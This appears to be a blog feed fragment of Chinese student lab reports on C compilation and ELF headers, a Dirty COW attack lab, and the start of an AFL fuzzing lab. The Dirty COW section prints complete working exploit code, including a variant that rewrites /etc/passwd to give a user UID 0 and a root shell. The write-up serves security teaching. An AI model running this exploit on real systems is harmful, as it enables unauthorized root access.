<h2 id="task-1c-编译过程"><a class="markdownIt-Anchor" href="#task-1c-编译过程"></a> Task 1：C 编译过程</h2>
<h3 id="预处理阶段"><a class="markdownIt-Anchor" href="#预处理阶段"></a> 预处理阶段</h3>
<p>进入到 /code/chapter1 目录下，输入 gcc -E -P compilation_example.c，输出结果为：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/1.1.png" alt="输出结果" /></p>
<pre><code>...
int
main(int argc, char *argv[]) &#123;
  printf(&quot;%s&quot;, &quot;Hello, world!\n&quot;);
  return 0;
&#125;
</code></pre>
<p>Q：对比原始代码，当前 main 函数有什么变化？</p>
<p>A：printf语句中的内容从参数(FORMAT_STRING ,MESSAGE)变成了这两个参数所指向的具体的内容(&quot;%s&quot;, &quot;Hello,world!<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∖</mo></mrow><annotation encoding="application/x-tex">\setminus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∖</span></span></span></span>n&quot;)。</p>
<h3 id="编译阶段"><a class="markdownIt-Anchor" href="#编译阶段"></a> 编译阶段</h3>
<p>输入 gcc -S compilation_example.c：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/1.2.png" alt="输出结果" /></p>
<p>输出结果为：</p>
<pre><code>    .file    &quot;compilation_example.c&quot;
    .section    .rodata
.LC0:
    .string &quot;Hello, world!&quot;
    .text
    .globl  main
    .type   main, @function
main:
.LFB0:
    .cfi_startproc
    pushq   %rbp
    .cfi_def_cfa_offset 16
    .cfi_offset 6, -16
    movq    %rsp, %rbp
    .cfi_def_cfa_register 6
    subq    $16, %rsp
    movl    %edi, -4(%rbp)
    movq    %rsi, -16(%rbp)
    movl    $.LC0, %edi
    call    puts
    movl    $0, %eax
    leave
    .cfi_def_cfa 7, 8
    ret
    .cfi_endproc
.LFE0:
    .size   main, .-main
    .ident  &quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.5) 5.4.0 20160609&quot;
    .section    .note.GNU-stack,&quot;&quot;,@progbits
</code></pre>
<h3 id="汇编阶段"><a class="markdownIt-Anchor" href="#汇编阶段"></a> 汇编阶段</h3>
<p>输入：gcc -c compilation_example.c：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/1.3.png" alt="输出结果" /></p>
<p>Q：当前生成的文件类型是什么？这个文件是否可以执行？为什么？</p>
<p>A：生成的文件是compilation_example.o，类型为目标文件；不可以直接执行，因为它还没有链接到其他的目标文件，所以它的代码段中有一些未定义的符号。</p>
<h3 id="链接阶段"><a class="markdownIt-Anchor" href="#链接阶段"></a> 链接阶段</h3>
<p>输入： gcc compilation_example.c， file a.out，./a.out</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/1.4.png" alt="输出结果" /></p>
<p>Q：当前生成的文件类型是什么？</p>
<p>A：生成的文件是a.out，类型为可执行文件。</p>
<h2 id="task-2符号与剥离的二进制文件"><a class="markdownIt-Anchor" href="#task-2符号与剥离的二进制文件"></a> Task 2：符号与剥离的二进制文件</h2>
<p>分别使用 nm 和 readelf 输出 a.out 二进制文件中的符号。</p>
<p>nm输出结果：</p>
<pre><code>...
0000000000400526 T main
                 U puts@@GLIBC_2.2.5
00000000004004a0 t register_tm_clones
0000000000400430 T _start
0000000000601038 D __TMC_END__
</code></pre>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/2.1.png" alt="nm输出结果" /></p>
<p>readelf中参数 -s 意为显示符号表，readelf输出结果：</p>
<pre><code>...
    __libc_start_main@@GLIBC_
    54: 0000000000601028     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    55: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    56: 0000000000601030     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    57: 00000000004005d0     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
    58: 0000000000400550   101 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
    59: 0000000000601040     0 NOTYPE  GLOBAL DEFAULT   26 _end
    60: 0000000000400430    42 FUNC    GLOBAL DEFAULT   14 _start
    61: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    62: 0000000000400526    32 FUNC    GLOBAL DEFAULT   14 main
    63: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _Jv_RegisterClasses
    64: 0000000000601038     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    65: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
    66: 00000000004003c8     0 FUNC    GLOBAL DEFAULT   11 _init
</code></pre>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/2.2.png" alt="readelf输出结果" /></p>
<p>Q：main 函数加载到内存时的驻留地址是什么？</p>
<p>A：驻留地址是0000000000400526。</p>
<p>--strip-all参数告诉strip移除文件中的所有符号信息。使用 strip 命令进行剥离，对于 a.out 再次执行 file 和 readelf -s：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/2.3.png" alt="输出结果" /></p>
<p>Q：此时对于 a.out 再次执行 file 和 readelf -s，结果有什么变化？运行 a.out，其功能有何变化？</p>
<p>A：使用file命令时发现出现了stripped状态；使用readlf -s命令时发现符号表&quot;.symtab&quot;被全部删除。运行a.out，发现依然输出&quot;Hello, world!&quot;，功能无变化。</p>
<h2 id="task-3反汇编二进制文件"><a class="markdownIt-Anchor" href="#task-3反汇编二进制文件"></a> Task 3：反汇编二进制文件</h2>
<p>-sj .rodata参数告诉objdump命令仅显示'.rodata'（只读数据）段的内容。输入objdump -sj .rodata compilation_example.o：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/3.1.png" alt="输出结果" /></p>
<p>Q：有哪些只读数据存储在.rodata 段中？</p>
<p>A：.rodata 段内容：0000 48656c6c 6f2c2077 6f726c64 2100 Hello, world!. 即只有输出内容存储在.rodata 段中。</p>
<p>-h参数告诉readelf显示ELF文件头的信息。输入readelf -h compilation_example.o：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/3.2.png" alt="输出结果" /></p>
<p>-d 参数告诉objdump显示反汇编目标文件的所有代码段。输入objdump -d compilation_example.o：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/3.3.png" alt="输出结果" /></p>
<p>反汇编一个完整的可执行二进制文件 a.out：</p>
<p>1、gcc compilation_example.c 指令重新生成 a.out 文件。</p>
<p>2、objdump -d a.out 指令反汇编 a.out。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/3.4.png" alt="完整的a.out的输出结果" /></p>
<p>3、strip --strip-all a.out 指令剥离基本符号信息</p>
<p>4、objdump -d a.out 指令反汇编被剥离的 a.out。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/3.5.png" alt="被剥离的a.out的输出结果" /></p>
<p>Q：对比带符号的二进制文件和已剥离的二进制文件的反汇编结果，你有什么发现？（在.text 方面）</p>
<p>A：在.text段，两者的机器指令是相同的。这是因为剥离符号信息并不会改变程序的执行逻辑。但是变量名有所区别，</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/3.6.png" alt="正常的a.out的.text输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/3.7.png" alt="被剥离的a.out的.text输出结果" /></p>
<h1 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h1>
<p>Q：你能识别 ELF 头部中字段代表的含义吗？尝试在 xxd 输出中找到所有 ELF 头部的字段，并解析这些字段内容的含义。</p>
<p>A：输入xxd compilation_example.o | head -n 30 查看前30行内容。我们可以按照 ELF 格式规范解析出各个字段的内容。以下是解析过程：</p>
<p>魔数（Magic）：7f45 4c46：ELF 文件的魔数，表示这是一个 ELF 文件。</p>
<p>类别（Class）：02：表示这是一个 64 位的 ELF 文件。</p>
<p>数据编码（Data）：01：表示这是一个小端序（Little Endian）的 ELF 文件。</p>
<p>版本（Version）：01：表示当前版本为 1。</p>
<p>操作系统/ABI（OS/ABI）：00：表示 System V ABI。</p>
<p>ABI 版本（ABI Version）：00：表示 ABI 版本为 0。</p>
<p>填充字节（Padding）：0000 0000 0000 0000：7 个字节的填充，用于对齐。</p>
<p>文件类型（Type）：0100：表示这是一个可重定位文件（Relocatable File）。</p>
<p>机器架构（Machine）：3e00：表示这是一个 AMD x86-64 架构。</p>
<p>版本（Version）：0100 0000：表示当前版本为 1。</p>
<p>入口点地址（Entry point address）：0000 0000 0000 0000：表示入口点地址为 0。</p>
<p>程序头部表的文件偏移量（Start of program headers）：0000 0000 0000 0000：表示程序头部表的偏移量为 0。</p>
<p>节头部表的文件偏移量（Start of section headers）：c002 0000 0000 0000：表示节头部表的偏移量为 0x2c0。</p>
<p>标志（Flags）：0000 0000：表示没有特殊标志。</p>
<p>头部大小（Size of this header）：4000：表示 ELF 头部的大小为 64 字节。</p>
<p>程序头部表中每个条目的大小（Size of program headers）：0000：表示程序头部表中每个条目的大小为 0。</p>
<p>程序头部表中条目的数量（Number of program headers）：0000：表示程序头部表中没有条目。</p>
<p>节头部表中每个条目的大小（Size of section headers）：4000：表示节头部表中每个条目的大小为 64 字节。</p>
<p>节头部表中条目的数量（Number of section headers）：0d00：表示节头部表中有 13 个条目。</p>
<p>节头部字符串表在节头部表中的索引（Section header string table index）：0a00：表示节头部字符串表在节头部表中的索引为 10。</p>
<p>之后的内容不属于 ELF 头部字段，而是程序的机器码和其他信息。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/4.1.png" alt="输出结果" /></p>
]]></content>
      <categories>
        <category>逆向工程与汇编语言</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Dirty_COW_Attack_Lab</title>
    <url>/posts/4a597bff.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>  1、获得 Dirty COW 攻击的实践经验。</p>
<p>  2、了解攻击所利用的竞争条件漏洞。</p>
<p>  3、更深入地了解一般竞争条件安全问题。</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>  利用 Dirty COW 竞争条件漏洞获得 root 权限。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>  Ubuntu 12.04 虚拟机。</p>
<h1 id="实验任务"><a class="markdownIt-Anchor" href="#实验任务"></a> 实验任务</h1>
<h2 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h2>
<h3 id="创建虚拟只读文件"><a class="markdownIt-Anchor" href="#创建虚拟只读文件"></a> 创建虚拟只读文件</h3>
<p>  步骤：</p>
<p>  1、sudo touch /zzz指令在根目录下创建一个名为 zzz 的空文件。</p>
<p>  2、sudo chmod 644 /zzz指令将 zzz 文件的权限设置为 644，即如果未获得根目录权限则对 zzz 文件的权限为只读。</p>
<p>  3、sudo gedit /zzz指令用 gedit 编辑器打开 zzz 文件。</p>
<p>  4、在 gedit 编辑器中输入&quot;SuperYzsisagoodman.&quot;，保存并关闭。</p>
<p>  5、ls -l /zzz指令查看 zzz 文件的权限，显示为-rw-r--r--，即文件所有者的权限为读写，同组用户和其他用户的权限为只读。</p>
<p>  6、echo 99999 &gt; /zzz 指令将 99999 写入 zzz 文件，显示为Permission denied，即无权限。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.1.png" alt="创建虚拟只读文件" /></p>
<h3 id="发起攻击"><a class="markdownIt-Anchor" href="#发起攻击"></a> 发起攻击</h3>
<p>  步骤：</p>
<p>  1、gedit cow_attack.c 创建一个名为 cow_attack.c 的 C 语言文件并使用 gedit 编辑器打开，编写攻击代码：</p>
<p>  main 线程将/zzz 映射到内存中，找到序列&quot;SuperYzs&quot;的位置，然后创建两个线程来利用操作系统内核中的 Dirty COW 竞争条件漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  下面 write 线程的任务是将内存中的字符串&quot;SuperYzs&quot;替换为&quot;********&quot;。由于映射的内存是 COW 类型，只有这个线程时仅能修改映射内存的副本，不会对底层的/zzz 文件进行任何更改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  madvise 线程只执行一项任务：丢弃映射内存的私有副本，以便页表可以重新指向原始映射内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  2、gcc cow_attack.c -lpthread 指令使用多线程编译指令-lpthread编译 cow_attack.c 文件，使用 ls 指令发现生成了a.out文件。</p>
<p>  3、./a.out 指令运行 a.out 文件，等待一顿时间后退出程序。</p>
<p>  4、cat /zzz 指令查看 zzz 文件，发现文件内容已经被修改 &quot;********isagoodman&quot;，即&quot;SuperYzs已被替换为&quot;********&quot;，攻击成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.2.png" alt="攻击步骤" /></p>
<h2 id="task-2-修改口令文件以获取-root-权限"><a class="markdownIt-Anchor" href="#task-2-修改口令文件以获取-root-权限"></a> Task 2: 修改口令文件以获取 Root 权限</h2>
<p>  步骤：</p>
<p>  1、使用sudo adduser charlie指令创建一个名为 charlie 的用户。</p>
<p>  2、使用cat /etc/passwd | grep charlie查看charlie的记录。</p>
<p>  3、使用gedit cow_attack.c 指令将cow_attack.c文件使用 gedit 编辑器打开，修改代码达到攻击目的：即找到/etc/passwd文件中的charlie记录，将其第三个字段改为0，注意改完之后的字段总长度与之前相同，不足的部分使用&quot;,&quot;补齐。</p>
<p>  4、使用gcc cow_attack.c -lpthread指令编译 cow_attack.c 文件，使用./a.out指令运行 a.out 文件，等待一顿时间后退出程序。</p>
<p>  5、再次使用cat /etc/passwd | grep charlie查看charlie的记录，发现第三个字符已经改为0了，即charlie已经具有了root权限。</p>
<p>  6、使用su charlie 切换到 charlie 用户，在 shell 提示符处看到 # 符号，这是 rootshell 的指示符。运行 id 命令，发现已经获得了 root 权限，攻击成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.1.png" alt="创建charlie用户" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.2.png" alt="Dirty COW 攻击" /></p>
<h1 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h1>
<h2 id="q1"><a class="markdownIt-Anchor" href="#q1"></a> Q1</h2>
<p>  会打印出字符串&quot;World&quot;。 当这个文件使用 mmap() 映射到内存（整个文件）时，每个字符都会被存储在连续的内存地址中，内存地址被存储在一个变量map 中，其中map指向映射内存的起始地址，也就是字符串&quot;Hello World&quot;的'H'的地址。map + 6则是指向'W'的地址，因此printf(&quot;%s\n&quot;, map + 6)；将从地址map + 6开始打印，直到遇到一个null字符（字符串结束标志），因此会打印出字符串&quot;World&quot;。</p>
<h2 id="q2"><a class="markdownIt-Anchor" href="#q2"></a> Q2</h2>
<p>  不可以。因为线程共享相同的地址空间，因此可以更容易地制造出Dirty-Cow攻击的必要条件；而进程则拥有独立的内存空间，使得攻击难以进行。</p>
<h1 id="代码附录"><a class="markdownIt-Anchor" href="#代码附录"></a> 代码附录</h1>
<h2 id="task1-2"><a class="markdownIt-Anchor" href="#task1-2"></a> Task1</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  file_size = st.st_size;</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the position of the target area</span></span><br><span class="line">  <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;charlie&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">  <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">  pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">  pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">  pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;   </span><br><span class="line">  <span class="type">char</span> *content=<span class="string">&quot;charlie:x:0:1002:,,,,,,,:/home/charlie:/bin/bash&quot;</span> ;</span><br><span class="line">  <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向工程与汇编语言</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzy-Testing-Technology</title>
    <url>/posts/e6e6ac69.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>1、学习模糊测试的基本理论和操作技巧</p>
<p>2、深入理解模糊测试在现代软件开发中的实际应用，特别是在提高软件安全性方面的重要作用。</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>模糊测试是一种自动化的软件测试技术，通过对程序输入进行随机变异生成大量的测试数据，以此检测程序在非预期输入下的行为，尤其是安全漏洞。American Fuzzy Lop（AFL）是一种流行的模糊测试工具，采用编译时插桩技术和遗传算法优化测试用例生成过程，提高了测试的效率和覆盖率。基于 AFL 的进一步发展，AFL++ 引入了新的优化和功能扩展，能更有效地支持大型项目的模糊测试需求。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>SEED Labs 2.0（64 位版）虚拟机。</p>
<h1 id="task-1使用十六进制编辑器修改-bare-metal-二进制文件"><a class="markdownIt-Anchor" href="#task-1使用十六进制编辑器修改-bare-metal-二进制文件"></a> Task 1：使用十六进制编辑器修改 Bare-Metal 二进制文件</h1>
<h2 id="task-1初探-afl"><a class="markdownIt-Anchor" href="#task-1初探-afl"></a> Task 1：初探 AFL</h2>
<h3 id="task-1a安装-afl"><a class="markdownIt-Anchor" href="#task-1a安装-afl"></a> Task 1.a：安装 AFL</h3>
<p>步骤：</p>
<p>1、输入 <code>git clone https://github.com/google/AFL.git</code> 克隆最新版本的源码，输入 <code>cd AFL</code> 进入 AFL 文件夹，输入 <code>make</code> 和 <code>sudo make install</code> 安装 AFL。</p>
